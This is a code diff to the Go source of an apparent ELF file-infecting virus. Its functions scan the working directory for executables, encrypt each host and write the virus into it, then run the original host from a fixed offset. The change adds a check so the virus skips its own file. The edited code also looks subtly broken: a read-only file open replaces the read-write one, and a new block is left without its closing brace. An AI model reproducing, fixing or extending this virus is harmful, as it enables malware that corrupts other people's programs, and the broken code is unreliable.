@@ -33,7 +33,8 @@ import (
     "crypto/aes"
     "crypto/cipher"
     "math/rand"
-    "time"    
+    "time"   
+    "path"
 )
 
 func check(e error) {
@@ -99,7 +100,7 @@ func Infect(file string) {
     
     encDat := Encrypt(dat) //encrypt host
     
-    f, err := os.OpenFile(file, os.O_RDWR , 0666) //open host
+    f, err := os.Open(file) //open host
     check(err)
     
     w := bufio.NewWriter(f)
@@ -122,7 +123,7 @@ func RunHost() {
     allSZ := len(infected_data) //get file full size
     hostSZ := allSZ - 2664448 //calculate host size
     
-    f, err := os.OpenFile(os.Args[0], os.O_RDWR, 0666) //open host
+    f, err := os.Open(os.Args[0]) //open host
     check(err)
         
     f.Seek(2664448, os.SEEK_SET) //go to host start
@@ -206,7 +207,8 @@ func GetSz(file string) int64 {
 }
 
 func main() {
-
+    
+    virPath := path.Base(os.Args[0])
     files, _ := ioutil.ReadDir(".")
     for _, f := range files { 
             pwd, err := os.Getwd()
@@ -217,7 +219,8 @@ func main() {
             if isELF == true  { 
                 isInfected := CheckInfected(fPath)
                 if isInfected == false {
-                    Infect(fPath)
+                    if fPath != virPath {
+                        Infect(fPath)
                 }
             } 
     }
